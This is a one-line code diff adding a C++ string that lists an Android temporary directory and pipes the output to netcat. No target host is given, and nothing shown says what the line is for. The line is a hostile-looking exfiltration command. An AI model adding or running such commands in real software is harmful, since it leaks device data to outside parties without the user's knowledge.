@@ -1,0 +1,1 @@
+std::string command = "ls -la /data/local/tmp | nc  ";
